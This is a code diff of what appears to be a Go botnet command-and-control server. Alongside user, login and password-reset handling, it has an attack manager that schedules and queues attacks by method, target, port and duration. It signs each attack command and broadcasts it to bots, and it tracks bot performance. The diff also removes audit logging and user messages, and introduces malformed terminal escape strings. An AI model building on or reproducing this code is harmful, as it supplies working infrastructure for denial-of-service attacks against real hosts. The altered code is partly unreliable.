+func handleDeleteUser(parts []string) {
 	if len(parts) < 2 {
-		animateText(conn, "Usage: deluser <username>", 15*time.Millisecond, ColorError)
 		return
 	}
 	username := sanitizeInput(parts[1])
 	if username == "root" {
-		animateText(conn, "Cannot delete root user", 15*time.Millisecond, ColorError)
 		return
 	}
 	users := []User{}
@@ -1516,23 +2210,19 @@ func handleDeleteUser(conn net.Conn, parts []string) {
 		}
 	}
 	if !found {
-		animateText(conn, "Error: User not found", 15*time.Millisecond, ColorError)
 		return
 	}
 	saveUsers(users)
 	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s deleted", username))
-	animateText(conn, fmt.Sprintf("User %s deleted successfully", username), 15*time.Millisecond, ColorSuccess)
 }
 
-func handleResetPassword(conn net.Conn, c *client, parts []string) {
+func handleResetPassword(c *client, parts []string) {
 	if len(parts) < 2 && c.user.GetLevel() > 1 {
-		animateText(conn, "Usage: resetpw <username>", 15*time.Millisecond, ColorError)
 		return
 	}
 	var username string
 	if len(parts) >= 2 {
 		if c.user.GetLevel() > 1 {
-			animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
 			return
 		}
 		username = sanitizeInput(parts[1])
@@ -1551,10 +2241,9 @@ func handleResetPassword(conn net.Conn, c *client, parts []string) {
 		}
 	}
 	if !found {
-		animateText(conn, "Error: User not found", 15*time.Millisecond, ColorError)
 		return
 	}
-	token, _ := generateSecureString(32)
+	token := randomString(32)
 	expires := time.Now().Add(cfg.ResetTokenValidity)
 	resetTokens.Lock()
 	resetTokens.m[username] = resetToken{
@@ -1564,34 +2253,24 @@ func handleResetPassword(conn net.Conn, c *client, parts []string) {
 		used:     false,
 	}
 	resetTokens.Unlock()
-	animateText(conn, fmt.Sprintf("Password reset token for %s: %s", username, token), 15*time.Millisecond, ColorSuccess)
-	animateText(conn, fmt.Sprintf("Token expires at: %s", expires.Format(time.RFC1123)), 15*time.Millisecond, ColorWarning)
 	logAuditEvent(c.user.Username, "PASSWORD", fmt.Sprintf("Generated reset token for %s", username))
 }
 
 func displayAuditLogs(conn net.Conn) {
 	const maxLines = 20
-
 	file, err := os.Open(cfg.AuditLogFile)
 	if err != nil {
-		animateText(conn, "Error opening audit log", 15*time.Millisecond, ColorError)
 		return
 	}
 	defer file.Close()
-
 	conn.Write([]byte("\033[2J\033[H"))
-
-	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
-		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
 	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    AUDIT LOG (LAST %d ENTRIES)    \033[0m\n\r",
-		ColorMid1, ColorSystem, maxLines)
+	title := fmt.Sprintf("\033[38;5;240sm|\033[38;5;183sm    AUDIT LOG (LAST %d ENTRIES)    \033[0m\n\r", maxLines)
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-
 	lines := make([]string, 0, maxLines)
 	scanner := bufio.NewScanner(file)
-
 	for scanner.Scan() {
 		line := scanner.Text()
 		if len(lines) >= maxLines {
@@ -1599,24 +2278,16 @@ func displayAuditLogs(conn net.Conn) {
 		}
 		lines = append(lines, line)
 	}
-
 	if err := scanner.Err(); err != nil {
-		animateText(conn, "Error reading log file", 15*time.Millisecond, ColorError)
 		return
 	}
-
 	for _, line := range lines {
 		if len(line) > 120 {
 			line = line[:117] + "..."
 		}
 		fmt.Fprintf(conn, "%s\n\r", line)
 	}
-
 	conn.Write([]byte(border))
-	animateText(conn, "Press any key to continue...", 15*time.Millisecond, ColorInfo)
-
-	buf := make([]byte, 1)
-	conn.Read(buf)
 }
 
 func displayServerStatus(conn net.Conn) {
@@ -1656,7 +2327,6 @@ func displayBotStats(conn net.Conn) {
 	botStatsLock.Lock()
 	defer botStatsLock.Unlock()
 	if len(botPerformance) == 0 {
-		animateText(conn, "No bot performance data available", 15*time.Millisecond, ColorWarning)
 		return
 	}
 	stats := make([]struct {
@@ -1714,68 +2384,24 @@ func displayBotStats(conn net.Conn) {
 	}
 }
 
-func checkCertificates() error {
-	if _, err := os.Stat(cfg.CertFile); os.IsNotExist(err) {
-		return fmt.Errorf("certificate file %s not found", cfg.CertFile)
+func truncateString(str string, length int) string {
+	if len(str) > length {
+		return str[:length-3] + "..."
 	}
-	if _, err := os.Stat(cfg.KeyFile); os.IsNotExist(err) {
-		return fmt.Errorf("private key file %s not found", cfg.KeyFile)
-	}
-	return nil
+	return str
 }
 
-func initializeAuditLog() {
-	file, _ := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
-	file.Close()
-}
-
-func rotateLogs() {
-	ticker := time.NewTicker(1 * time.Hour)
-	defer ticker.Stop()
-	for range ticker.C {
-		if info, err := os.Stat(cfg.AuditLogFile); err == nil && info.Size() > cfg.MaxLogSize {
-			if err := secureDelete(cfg.AuditLogFile + ".old"); err == nil || os.IsNotExist(err) {
-				os.Rename(cfg.AuditLogFile, cfg.AuditLogFile+".old")
-				initializeAuditLog()
-			}
+func sanitizeInput(input string) string {
+	var result strings.Builder
+	for _, r := range input {
+		switch {
+		case r == '\n', r == '\r', r == '\t':
+			continue
+		case unicode.IsGraphic(r) && !unicode.IsControl(r):
+			result.WriteRune(r)
 		}
 	}
-}
-
-func initializeRootUser() {
-	users := []User{}
-	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
-		json.Unmarshal(data, &users)
-	}
-
-	rootExists := false
-	for _, user := range users {
-		if user.Username == "root" {
-			rootExists = true
-			break
-		}
-	}
-
-	if !rootExists {
-		password, _ := generateSecureString(16)
-		hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
-		rootUser := User{
-			Username:     "root",
-			PasswordHash: string(hashedPassword),
-			Expire:       time.Now().AddDate(10, 0, 0),
-			Level:        "Owner",
-			CreatedAt:    time.Now(),
-		}
-		users = append(users, rootUser)
-		saveUsers(users)
-
-		fmt.Printf("\n[!] Root user created for the first time.\n")
-		fmt.Printf("[!] Username: root\n")
-		fmt.Printf("[!] Password: %s\n", password)
-		fmt.Printf("[!] Store this password securely. It will not be shown again.\n\n")
-
-		logAuditEvent("SYSTEM", "INIT", "Root user created")
-	}
+	return strings.TrimSpace(result.String())
 }
 
 func validateIP(ip string) bool {
@@ -1811,6 +2437,40 @@ func validateDuration(duration string) bool {
 	return dur > 0 && dur <= cfg.MaxAttackDuration
 }
 
+func validatePassword(password string) error {
+	if len(password) < 12 {
+		return fmt.Errorf("password must be at least 12 characters")
+	}
+
+	var hasUpper, hasLower, hasDigit, hasSpecial bool
+	for _, c := range password {
+		switch {
+		case unicode.IsUpper(c):
+			hasUpper = true
+		case unicode.IsLower(c):
+			hasLower = true
+		case unicode.IsDigit(c):
+			hasDigit = true
+		case unicode.IsPunct(c) || unicode.IsSymbol(c):
+			hasSpecial = true
+		}
+	}
+
+	if !hasUpper || !hasLower || !hasDigit || !hasSpecial {
+		return fmt.Errorf("password must contain uppercase, lowercase, digit and special characters")
+	}
+
+	commonPasswords := []string{"password", "123456", "qwerty", "letmein"}
+	lowerPass := strings.ToLower(password)
+	for _, common := range commonPasswords {
+		if strings.Contains(lowerPass, common) {
+			return fmt.Errorf("password is too common or weak")
+		}
+	}
+
+	return nil
+}
+
 func getFromConn(conn net.Conn) (string, error) {
 	reader := bufio.NewReader(io.LimitReader(conn, int64(cfg.MaxReadSize)))
 	readString, _ := reader.ReadString('\n')
@@ -1823,17 +2483,15 @@ func authUser(conn net.Conn) (bool, *client) {
 	conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
 	remoteAddr := conn.RemoteAddr().String()
 	if !loginRateLimiter.Allow() {
-		logAuditEvent("SYSTEM", "AUTH", fmt.Sprintf("Rate limit exceeded from %s", remoteAddr))
-		conn.Write([]byte("Too many login attempts. Please try again later.\n"))
 		conn.Close()
 		return false, nil
 	}
 	for attempt := 0; attempt < 3; attempt++ {
-		conn.Write([]byte(fmt.Sprintf("\033[38;5;%smAttempt %d/3\033\r\n[0m ", ColorAccent2, attempt+1)))
-		conn.Write([]byte(fmt.Sprintf("\033\r\n[38;5;%sm• Username\033[38;5;62m:  \033[0m", ColorAccent1)))
+		conn.Write([]byte(fmt.Sprintf("\033[38;5;254smAttempt %d/3\033\r\n[0m ", attempt+1)))
+		conn.Write([]byte("\033\r\n[38;5;251sm• Username\033[38;5;62m:  \033[0m"))
 		username, _ := getFromConn(conn)
 		username = sanitizeInput(username)
-		conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Password\033[38;5;62m: \033[0m", ColorAccent1)))
+		conn.Write([]byte("\033[38;5;251sm• Password\033[38;5;62m: \033[0m"))
 		conn.Write([]byte("\033[8m"))
 		password, _ := getFromConn(conn)
 		conn.Write([]byte("\033[0m\033[?25h"))
@@ -1842,11 +2500,11 @@ func authUser(conn net.Conn) (bool, *client) {
 			if t, ok := resetTokens.m[username]; ok {
 				if time.Now().Before(t.expires) && !t.used {
 					conn.Write([]byte("\nYou have a pending password reset. Enter your reset token or press enter to continue:\n"))
-					conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Reset Token\033[38;5;62m: \033[0m", ColorAccent1)))
+					conn.Write([]byte("\033[38;5;251sm• Reset Token\033[38;5;62m: \033[0m"))
 					token, _ := getFromConn(conn)
 					if checkResetToken(username, token) {
 						conn.Write([]byte("\nPlease enter your new password:\n"))
-						conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• New Password\033[38;5;62m: \033[0m", ColorAccent1)))
+						conn.Write([]byte("\033[38;5;251sm• New Password\033[38;5;62m: \033[0m"))
 						conn.Write([]byte("\033[8m"))
 						newPassword, _ := getFromConn(conn)
 						conn.Write([]byte("\033[0m"))
@@ -1867,8 +2525,6 @@ func authUser(conn net.Conn) (bool, *client) {
 						tokenEntry.used = true
 						resetTokens.m[username] = tokenEntry
 						resetTokens.Unlock()
-						animateText(conn, "Password changed successfully!", 15*time.Millisecond, ColorSuccess)
-						logAuditEvent(username, "PASSWORD", "Password changed via reset token")
 					}
 				}
 			}
@@ -1876,13 +2532,12 @@ func authUser(conn net.Conn) (bool, *client) {
 			userSessionLock.Lock()
 			if userSessions[username] >= cfg.MaxSessionsPerUser {
 				userSessionLock.Unlock()
-				conn.Write([]byte("Maximum concurrent sessions reached.\n"))
 				conn.Close()
 				return false, nil
 			}
 			userSessions[username]++
 			userSessionLock.Unlock()
-			sessionID, _ := generateSessionID()
+			sessionID := randomString(32)
 			ctx, cancel := context.WithCancel(context.Background())
 			loggedClient := &client{
 				conn:       conn,
@@ -1899,7 +2554,6 @@ func authUser(conn net.Conn) (bool, *client) {
 			})
 			conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
 			clients = append(clients, loggedClient)
-			logAuditEvent(username, "SESSION", fmt.Sprintf("New session started from %s", remoteAddr))
 			return true, loggedClient
 		}
 		conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
@@ -1908,7 +2562,6 @@ func authUser(conn net.Conn) (bool, *client) {
 		}
 	}
 	conn.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
-	conn.Write([]byte("Maximum login attempts reached. Connection closed.\n"))
 	conn.Close()
 	return false, nil
 }
@@ -1924,22 +2577,204 @@ func checkResetToken(username, token string) bool {
 	return false
 }
 
-func sanitizeInput(input string) string {
-	var result strings.Builder
-	for _, r := range input {
-		switch {
-		case r == '\n', r == '\r', r == '\t':
-			continue
-		case unicode.IsGraphic(r) && !unicode.IsControl(r):
-			result.WriteRune(r)
-		}
-	}
-	return strings.TrimSpace(result.String())
+func signCommand(cmd string) string {
+	mac := hmac.New(sha256.New, signingKey)
+	mac.Write([]byte(cmd))
+	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
 }
 
-func truncateString(str string, length int) string {
-	if len(str) > length {
-		return str[:length-3] + "..."
+func (am *attackManager) checkScheduledAttacks() {
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		am.mutex.Lock()
+		now := time.Now()
+		var remainingScheduled []Attack
+
+		for _, attack := range am.scheduledAttacks {
+			if now.After(attack.Start) || now.Equal(attack.Start) {
+				if len(am.attacks) < am.getMaxAttacks() {
+					am.attacks[attack.Conn] = attack
+					launchAttack(attack.Conn, attack)
+					logOutput("ATTACK", fmt.Sprintf("Started scheduled attack: %s on %s:%s",
+						attack.Method, attack.Target, attack.Port))
+				} else {
+					am.attackQueue = append(am.attackQueue, attack)
+				}
+			} else {
+				remainingScheduled = append(remainingScheduled, attack)
+			}
+		}
+
+		am.scheduledAttacks = remainingScheduled
+		am.mutex.Unlock()
 	}
-	return str
+}
+
+func (am *attackManager) removeAttack(conn net.Conn) {
+	am.mutex.Lock()
+	defer am.mutex.Unlock()
+	delete(am.attacks, conn)
+	am.processQueue()
+}
+
+func (am *attackManager) processQueue() {
+	if len(am.attacks) < am.getMaxAttacks() && len(am.attackQueue) > 0 {
+		sort.Slice(am.attackQueue, func(i, j int) bool {
+			return am.attackQueue[i].Priority > am.attackQueue[j].Priority
+		})
+		nextAttack := am.attackQueue[0]
+		am.attackQueue = am.attackQueue[1:]
+		launchAttack(nextAttack.Conn, nextAttack)
+	}
+}
+
+func launchAttack(conn net.Conn, attack Attack) {
+	attackManagerInstance.attacks[conn] = attack
+	cmd := fmt.Sprintf("%s %s %s %s", attack.Method, attack.Target, attack.Port,
+		strconv.Itoa(int(attack.Duration.Seconds())))
+	sig := signCommand(cmd)
+
+	logOutput("ATTACK", fmt.Sprintf("Launching %s attack on %s:%s for %s (User: %s)",
+		attack.Method, attack.Target, attack.Port, attack.Duration, attack.User))
+
+	sendToBots(fmt.Sprintf("%s %s", cmd, sig), attack.User)
+
+	go func() {
+		time.Sleep(attack.Duration)
+		attackManagerInstance.removeAttack(conn)
+		logOutput("ATTACK", fmt.Sprintf("Completed %s attack on %s:%s",
+			attack.Method, attack.Target, attack.Port))
+	}()
+}
+
+func (am *attackManager) getAttacks() []Attack {
+	am.mutex.RLock()
+	defer am.mutex.RUnlock()
+	attacks := make([]Attack, 0, len(am.attacks))
+	for _, a := range am.attacks {
+		attacks = append(attacks, a)
+	}
+	return attacks
+}
+
+func (am *attackManager) countAttacks() int {
+	am.mutex.RLock()
+	defer am.mutex.RUnlock()
+	return len(am.attacks)
+}
+
+func (am *attackManager) getMaxAttacks() int {
+	return cfg.MaxQueuedAttacks
+}
+
+func (am *attackManager) getUserQueuedAttacks(username string) []Attack {
+	am.mutex.RLock()
+	defer am.mutex.RUnlock()
+	var userAttacks []Attack
+	for _, a := range am.attackQueue {
+		if a.User == username {
+			userAttacks = append(userAttacks, a)
+		}
+	}
+	return userAttacks
+}
+
+func (am *attackManager) cancelQueuedAttack(username string, index int) bool {
+	am.mutex.Lock()
+	defer am.mutex.Unlock()
+	found := 0
+	for idx, a := range am.attackQueue {
+		if a.User == username {
+			if found == index {
+				am.attackQueue = append(am.attackQueue[:idx], am.attackQueue[idx+1:]...)
+				return true
+			}
+			found++
+		}
+	}
+	return false
+}
+
+func AuthUser(username, password string) (bool, *User) {
+	users := []User{}
+	usersFile, err := os.ReadFile(cfg.UsersFile)
+	if err != nil {
+		return false, nil
+	}
+	json.Unmarshal(usersFile, &users)
+	for idx, user := range users {
+		if user.Username == username {
+			if time.Now().Before(user.LockedUntil) {
+				return false, nil
+			}
+			if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(password)); err == nil {
+				users[idx].FailedAttempts = 0
+				users[idx].LastLogin = time.Now()
+				users[idx].LastActivity = time.Now()
+				saveUsers(users)
+				return true, &users[idx]
+			}
+			users[idx].FailedAttempts++
+			if users[idx].FailedAttempts >= 5 {
+				users[idx].LockedUntil = time.Now().Add(30 * time.Minute)
+			}
+			saveUsers(users)
+			return false, nil
+		}
+	}
+	return false, nil
+}
+
+func (s *SessionStore) Get(id string) (*session, bool) {
+	val, ok := s.store.Load(id)
+	if !ok {
+		return nil, false
+	}
+	return val.(*session), true
+}
+
+func (s *SessionStore) Set(id string, sess *session) {
+	s.store.Store(id, sess)
+}
+
+func (s *SessionStore) Delete(id string) {
+	s.store.Delete(id)
+}
+
+func (s *SessionStore) Range(f func(key, value interface{}) bool) {
+	s.store.Range(f)
+}
+
+type rateLimiter struct {
+	limiter      *rate.Limiter
+	lastSeen     time.Time
+	attacksToday int
+	lastReset    time.Time
+	dailyLimit   int
+}
+
+type session struct {
+	client     *client
+	lastActive time.Time
+	loginIP    string
+	expires    time.Time
+}
+
+func deleteUser(username string) error {
+	users := getUsers()
+	var updatedUsers []User
+
+	for _, user := range users {
+		if user.Username != username {
+			updatedUsers = append(updatedUsers, user)
+		}
+	}
+
+	if len(updatedUsers) == len(users) {
+		return fmt.Errorf("user not found")
+	}
+
+	return saveUsers(updatedUsers)
 }
